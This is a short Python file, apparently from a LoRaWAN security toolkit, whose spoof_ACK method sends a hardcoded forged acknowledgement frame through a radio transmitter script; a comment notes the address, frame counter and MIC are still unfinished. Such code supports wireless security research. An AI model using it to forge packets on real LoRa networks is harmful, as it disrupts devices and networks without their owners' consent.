import json

from src.command_handler import CommandHandler

class Player(CommandHandler):

    def __init__(self):
        self.TRANSMITTER_PATH = './sniffers/lora_transmitter.py'

    def spoof_ACK(self):
        payload='6088889999200b00bae1557a' #TODO EDIT TO HAVE PROPER DEVADDR, FCNT AND PRE-AMBLE? + MIC COMPUTATION
        with open('./config/transmitter.config', 'r') as file:
            parameters = json.load(file)
        sample_rate = parameters['sample_rate']
        bandwidth = parameters['bandwidth']
        frequency = str(parameters['frequency'])
        spreading_factor = str(parameters['spreading_factor'])
        gain = str(parameters['gain_db'])
        script_path = './sniffers/packet_transmitter.py'
        command = ['python3', script_path, '--frequency', frequency, '--bandwidth', bandwidth, '--samp-rate', sample_rate, '--spreading-factor', spreading_factor, '--gain-db', gain, '--message', payload]
        self.execute_command(command)